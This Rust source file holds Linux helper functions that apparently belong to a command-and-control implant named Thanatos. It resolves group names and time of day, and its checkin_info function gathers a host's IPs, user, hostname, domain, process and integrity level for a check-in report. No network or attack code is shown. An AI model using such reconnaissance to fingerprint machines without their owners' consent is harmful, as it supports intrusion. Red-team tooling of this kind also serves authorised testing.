//! Helper functions which are linux specific.

use crate::{errors::ThanatosError, CheckinInfo};
use std::{ffi::CStr, time::Duration};

pub mod info;
pub mod linhelpers;

/// Converts a integer `gid` into a group name.
///
/// Parameters:
/// * `gid` - Group ID to find the group name from
pub fn group_from_gid(gid: u32) -> Result<String, ThanatosError> {
    let g_struct = unsafe { libc::getgrgid(gid) };

    if g_struct.is_null() {
        return Err(ThanatosError::os_error());
    }

    let raw_group = unsafe { CStr::from_ptr((*g_struct).gr_name) };

    raw_group
        .to_str()
        .map(|s| s.to_string())
        .map_err(|_| ThanatosError::StringParseError)
}

/// Get the time elapsed since midnight
pub fn get_timeofday() -> Duration {
    let timestamp = unsafe { libc::time(std::ptr::null_mut()) };
    let (hour, minute, second) = unsafe {
        let ts = libc::localtime(&timestamp);
        if ts.is_null() {
            (0, 0, 0)
        } else {
            (
                (*ts).tm_hour as u64 * 3600,
                (*ts).tm_min as u64 * 60,
                (*ts).tm_sec as u64,
            )
        }
    };

    return Duration::from_secs(hour + minute + second);
}

/// Get the initial check in information for Linux
pub fn checkin_info() -> CheckinInfo {
    CheckinInfo {
        ips: info::internal_ips().ok(),
        os: info::platform(),
        user: info::username().ok(),
        host: info::hostname().ok(),
        pid: std::process::id(),
        architecture: std::env::consts::ARCH.to_string(),
        domain: info::domain().ok(),
        integrity_level: info::integrity_level(),
        process_name: info::process_name().ok(),
    }
}
